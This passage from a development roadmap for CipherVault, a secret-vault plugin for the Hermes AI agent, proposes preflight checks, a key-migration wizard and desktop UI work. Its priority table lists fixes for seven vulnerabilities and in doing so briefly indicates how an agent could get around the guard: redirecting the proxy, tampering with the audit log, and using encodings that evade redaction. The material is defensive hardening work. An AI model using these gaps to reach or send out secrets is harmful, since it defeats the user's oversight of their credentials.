- **What's missing today:** Every new Hermes session starts "cold" — the model doesn't know if a vault exists, whether `.env` is sealed or sitting in plaintext on disk, whether the CLI binary matches `RELEASE_VERSION`, or whether `git` currently has sprawl violations. So it wastes turns calling `status` and `scan` repeatedly (or hits a surprise block on `git commit`).
- **The Meta Fix:**
  - On first tool call in a workspace, run an ultra-fast cached preflight (status + sealed check + drift count) and attach a tiny compact metadata banner to CipherVault tool outputs (or a lightweight workspace posture summary via `SKILL.md` / middleware):
    `[CipherVault: sealed | HEAD a81f2c | 12 keys | policy: 2 profiles (test, llm_eval) | sprawl: clean]`
  - Automatically detect dangerous patterns early — e.g., if `working_tree_sealed == false` and `.env` sits plaintext on disk, proactively remind the user/agent in status/doctor output to run `ciphervault_push(shred_working_copy=True)`.

#### 3. Hermes Native Secret-Source Auto-Wiring + Sub-Agent Guard Propagation
- Right now `plugins/ciphervault/__init__.py` already registers `_make_secret_source()` (`secrets.ciphervault.enabled: true`) — *a huge hidden gem most users don't know exists*. Expose a 1-click setup / `hermes ciphervault setup` wizard that:
  1. Bootstraps the binary (`SHA-256` verified).
  2. Initializes/migrates `.ciphervault/policy.toml`.
  3. Wires Hermes's own provider keys (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, etc.) out of `~/.hermes/.env` plaintext and into the CipherVault `SecretSource` automatically.
- Ensure any spawned sub-agents / background `execute_code` runtimes inherit the exact same `pre_tool_call` + `transform_tool_result` hooks and fail-closed `ciphervault_redact` policy.

---

### C. Upgrading the Hermes Desktop UI (`plugins/ciphervault/desktop/plugin.js` & `dashboard/plugin_api.py`)

Currently `desktop/plugin.js` only displays a static read-only status box and 4 "Copy prompt" buttons. Turning it into an interactive **Zero-Knowledge Side-Pane** solves the hardest UX problems natively in the GUI:

1. **Interactive Secret Entry Drawer (`POST /api/plugins/ciphervault/set`):**
   - Masked `KEY` + `VALUE` inputs right in the Hermes pane (never entering LLM context, piped directly to `ciphervault secret set --stdin` + `push --local --shred`).
2. **One-Click "Seal Working Tree (Shred `.env`)" Toggle & Live Exposure Indicator:**
   - Statusbar chip (`cv • vault`) turns **green (`sealed`)** when `working_tree_sealed == true` (0 plaintext bytes on disk), **amber (`plaintext on disk`)** when tracked `.env` files exist on disk, with a 1-click **Seal Now** button.
3. **Env Health & Schema Diff Tab:**
   - Shows `missing_in_vault` / `unreferenced` / `value_anomalies` from `ciphervault_env_doctor` visually with a "Prompt user for missing keys" button for each missing key.
4. **Live Agent Audit Trail + Chain Verification Indicator:**
   - Displays the last 10 entries from `ciphervault agent-log show --json` with a green **Signature & Anchor Verified** pill so the user can visually verify what the agent was blocked from touching.

---

## 5. Prioritized Implementation Matrix (What to Work On Next)

| Priority | Item | Category | Effort | Impact | Primary Files |
| :---: | :--- | :--- | :---: | :---: | :--- |
| **P0** | Fix Vuln-1 & Vuln-2: Remove agent-controlled `proxy_upstream`, forbid loopback/arbitrary remote upstreams without policy/CLI flag, normalize `proxy_upstream` in `_effective_no_net` | Security | Small–Med | **Critical** | `apps/cli/src/commands/run_proxy.rs`, `apps/cli/src/commands/mcp.rs`, `plugins/ciphervault/__init__.py` |
| **P0** | Fix Vuln-3: Bind approval `rule_key` to `no_net` + `proxy` + `allow_keys` + subcommand/interpreter | Security | Small | **High** | `plugins/ciphervault/__init__.py` |
| **P0** | Fix Vuln-4: Remove `init`/`agent-log`/`untrack`/`prune`/`rekey` from `_SAFE_SECRET_PATH_CMD_RE`; block `agent-log record`/`anchor` in `agent_hooks.rs`; switch audit signatures to domain-separated `sign_with_domain`/`verify_strict` | Security | Small–Med | **High** | `plugins/ciphervault/__init__.py`, `apps/cli/src/commands/agent_hooks.rs`, `apps/cli/src/commands/agent_log.rs`, `crates/local-store/src/db.rs` |
| **P0** | Fix Vuln-5: Add `base64url` + phase-shifted Base64 + multi-PEM body lines + whitespace-only YAML `#` comments + `vault.db-wal` cache fingerprinting | Security | Medium | **High** | `crates/redact/src/lib.rs`, `apps/cli/src/commands/agent_bridge.rs` |
| **P0** | Fix Vuln-6 & Vuln-7: Bootstrap token for `ui --local`, block loopback dashboard API calls in agent hooks, validate `cwd` against UNC paths in `plugin_api.py`, collapse legacy Python MCP server into `ciphervault mcp` | Security | Medium | **Med–High** | `apps/cli/src/dashboard/handlers.rs`, `apps/cli/src/dashboard/files_api.rs`, `plugins/ciphervault/dashboard/plugin_api.py`, `services/mcp/ciphervault_mcp_server.py` |
| **P1** | Build **`ciphervault_env_doctor`** (zero-knowledge code/schema/URL/prefix/expiry linter) | Plugin / CLI | Medium | **Very High** | New CLI command + `plugins/ciphervault/__init__.py` + `apps/cli/src/commands/mcp.rs` |
| **P1** | Build **`ciphervault_secret_generate`** (in-vault `OsRng` secret provisioning returning hash/length only) | Plugin / CLI | Small–Med | **High** | `apps/cli/src/commands/secret.rs`, `plugins/ciphervault/__init__.py` |
| **P1** | Introduce **`.ciphervault/policy.toml` execution profiles** (`ciphervault_run(profile=...)`) + persistent `sealed_mode = true` | Meta / Policy | Medium | **Very High** | `apps/cli/src/commands/run.rs`, `plugins/ciphervault/__init__.py` |
| **P1** | Expose **`ciphervault_diff`** (masked key diff tool) & surface `--json` Win32 AppContainer hints / `site-packages` guidance | Plugin / CLI | Small | **Medium** | `plugins/ciphervault/__init__.py`, `apps/cli/src/commands/run.rs` |
| **P2** | Build **`ciphervault_secret_prompt`** + upgrade **Hermes Desktop Side-Pane** (masked secret input drawer, 1-click "Seal `.env`", live audit feed) | Plugin UI / UX | Med–Large | **High** | `plugins/ciphervault/desktop/plugin.js`, `plugins/ciphervault/dashboard/plugin_api.py`, `plugins/ciphervault/__init__.py` |
| **P2** | Run live CI verification on **macOS** & **desktop Linux** (`sandbox-exec`, Keychain, `secret-tool`, `pcscd`, `rusqlite` CLI) | Portability | Medium | **High** | `.github/workflows/ci.yml` |
